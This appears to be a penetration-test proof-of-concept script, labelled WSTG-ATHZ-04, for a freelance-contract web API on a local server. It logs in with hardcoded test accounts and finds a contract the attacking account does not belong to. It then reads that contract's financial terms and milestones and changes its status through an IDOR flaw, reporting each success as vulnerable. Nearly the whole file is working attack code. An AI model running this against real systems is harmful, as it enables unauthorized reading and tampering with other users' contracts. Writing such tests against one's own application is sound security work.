#!/usr/bin/env python3
"""
WSTG-ATHZ-04: Contract IDOR (Insecure Direct Object Reference)

Vulnerability: The contracts API endpoints authenticate the user but do NOT
verify that the authenticated user is a party to the contract they are accessing.

- GET /api/contracts/:id - any authenticated user can view any contract's details
  including financial terms, milestones, and party information.
- PUT /api/contracts/:id/status - any authenticated user can change any contract's
  status (activate, cancel, etc.), not just the client or freelancer on the contract.

The controller at contracts.controller.js line 28 fetches the contract by ID
without checking if req.user.id matches either client_id or freelancer_id.

Impact: Any authenticated user can read all contracts and modify their status,
potentially cancelling or completing other users' contracts.
"""

import requests
import sys
import json

BASE_URL = "http://localhost:3000"

# Multiple accounts with fallbacks
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]
ATTACKER_ACCOUNTS = [
    {"email": "oliver.grant@greenleaf.co", "password": "password123"},
    {"email": "james.oconnor@outlook.com", "password": "password123"},
    {"email": "priya.sharma@gmail.com", "password": "password123"},
]


def try_login(accounts, role_label="user"):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            data = resp.json()
            return data["token"], data["user"]
    print(f"    ERROR: No {role_label} account could be logged in.")
    sys.exit(1)


def main():
    print("=" * 70)
    print("WSTG-ATHZ-04: Contract IDOR - Unauthorized Contract Access & Modification")
    print("=" * 70)

    # Step 1: Login as two different users
    print("\n[1] Logging in as two different users...")
    victim_token, victim_user = try_login(CLIENT_ACCOUNTS, "victim")
    print(f"    Victim:   {victim_user['email']} (id: {victim_user['id'][:12]}...)")

    attacker_token, attacker_user = try_login(ATTACKER_ACCOUNTS, "attacker")
    print(f"    Attacker: {attacker_user['email']} (id: {attacker_user['id'][:12]}...)")

    victim_headers = {"Authorization": f"Bearer {victim_token}"}
    attacker_headers = {"Authorization": f"Bearer {attacker_token}"}

    # Step 2: Find contracts that exist in the system
    # List contracts for both users to find any contract IDs
    print("\n[2] Finding contracts in the system...")
    resp_v = requests.get(f"{BASE_URL}/api/contracts", headers=victim_headers)
    victim_contracts = resp_v.json().get("contracts", []) if resp_v.status_code == 200 else []
    print(f"    Victim has {len(victim_contracts)} contract(s)")

    resp_a = requests.get(f"{BASE_URL}/api/contracts", headers=attacker_headers)
    attacker_contracts = resp_a.json().get("contracts", []) if resp_a.status_code == 200 else []
    print(f"    Attacker has {len(attacker_contracts)} contract(s)")

    # Find a contract where the attacker is NOT a party
    target_contract = None
    target_source = None

    # Check victim's contracts
    for c in victim_contracts:
        if c.get("client_id") != attacker_user["id"] and c.get("freelancer_id") != attacker_user["id"]:
            target_contract = c
            target_source = "victim"
            break

    # If no suitable victim contract, try to find any contract by trying more users
    if not target_contract:
        # Try logging in with yet another account to find contracts
        more_accounts = [
            {"email": "testfreelancer@hireflow.com", "password": "password123"},
            {"email": "bob.admin@hireflow.com", "password": "password123"},
            {"email": "rachel.kumar@medisync.health", "password": "password123"},
            {"email": "david.brown@novacraft.dev", "password": "password123"},
        ]
        for creds in more_accounts:
            resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
            if resp.status_code == 200:
                tmp_token = resp.json()["token"]
                tmp_user = resp.json()["user"]
                resp_c = requests.get(
                    f"{BASE_URL}/api/contracts",
                    headers={"Authorization": f"Bearer {tmp_token}"}
                )
                if resp_c.status_code == 200:
                    contracts = resp_c.json().get("contracts", [])
                    for c in contracts:
                        if c.get("client_id") != attacker_user["id"] and c.get("freelancer_id") != attacker_user["id"]:
                            target_contract = c
                            target_source = tmp_user["email"]
                            break
                if target_contract:
                    break

    # Step 3: Try IDOR access
    if target_contract:
        contract_id = target_contract["id"]
        print(f"\n[3] Found target contract: {contract_id[:12]}...")
        print(f"    Source: {target_source}")
        print(f"    Client on contract:     {target_contract.get('client_id', 'N/A')[:12]}...")
        print(f"    Freelancer on contract: {target_contract.get('freelancer_id', 'N/A')[:12]}...")
        print(f"    Attacker user ID:       {attacker_user['id'][:12]}...")
        print(f"    Attacker is NOT a party to this contract.")

        # Read the contract as the attacker
        print(f"\n    Attempting GET /api/contracts/{contract_id[:12]}... as attacker:")
        resp = requests.get(
            f"{BASE_URL}/api/contracts/{contract_id}",
            headers=attacker_headers
        )
        print(f"    Status: {resp.status_code}")

        if resp.status_code == 200:
            contract_data = resp.json()
            print(f"    [VULNERABLE] Successfully read contract details!")
            print(f"    Title: {contract_data.get('title', 'N/A')}")
            print(f"    Total Amount: {contract_data.get('total_amount', 'N/A')}")
            print(f"    Status: {contract_data.get('status', 'N/A')}")
            milestones = contract_data.get("milestones", [])
            print(f"    Milestones: {len(milestones)}")
            for m in milestones[:3]:
                print(f"      - {m.get('title', 'N/A')}: amount={m.get('amount', 0)}")
        else:
            print(f"    Access denied: {resp.text[:200]}")

        # Step 4: Try status change IDOR
        print(f"\n[4] Attempting to change contract status as attacker...")
        current_status = target_contract.get("status", "unknown")
        print(f"    Current status: {current_status}")

        if current_status == "pending":
            new_status = "active"
        elif current_status == "active":
            new_status = "disputed"
        else:
            new_status = None

        if new_status:
            resp = requests.put(
                f"{BASE_URL}/api/contracts/{contract_id}/status",
                json={"status": new_status},
                headers=attacker_headers
            )
            print(f"    PUT status -> '{new_status}': {resp.status_code}")
            if resp.status_code == 200:
                result = resp.json()
                print(f"    [VULNERABLE] Status changed to: {result.get('status', 'N/A')}")
                print(f"    Any authenticated user can modify any contract's status!")
            else:
                print(f"    Response: {resp.text[:200]}")
        else:
            print(f"    Contract in terminal state ({current_status}), skipping status change test.")
            print(f"    The read IDOR is still confirmed above.")
    else:
        print("\n[3] No contracts found in the system. Creating one to test IDOR...")
        # Create a contract as victim, then access as attacker
        # First we need a freelancer
        freelancer_resp = requests.get(f"{BASE_URL}/api/users?role=freelancer&limit=1")
        freelancers = freelancer_resp.json().get("users", [])
        if freelancers:
            fl_id = freelancers[0]["id"]
            create_resp = requests.post(
                f"{BASE_URL}/api/contracts",
                json={
                    "freelancer_id": fl_id,
                    "title": "IDOR Test Contract",
                    "description": "Testing contract access control",
                    "amount": 50000,
                },
                headers=victim_headers
            )
            if create_resp.status_code == 201:
                new_contract = create_resp.json()
                contract_id = new_contract.get("id")
                print(f"    Created contract: {contract_id}")

                # Now try to access it as attacker
                resp = requests.get(
                    f"{BASE_URL}/api/contracts/{contract_id}",
                    headers=attacker_headers
                )
                print(f"    Attacker GET: {resp.status_code}")
                if resp.status_code == 200:
                    print(f"    [VULNERABLE] Attacker can read contract they are not party to!")
                    print(f"    Title: {resp.json().get('title', 'N/A')}")
            else:
                print(f"    Create failed: {create_resp.status_code} {create_resp.text[:200]}")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: Contract IDOR allows any authenticated user to read and")
    print("modify contracts they are not a party to. The controller never checks")
    print("if req.user.id matches client_id or freelancer_id on the contract.")
    print("=" * 70)


if __name__ == "__main__":
    main()
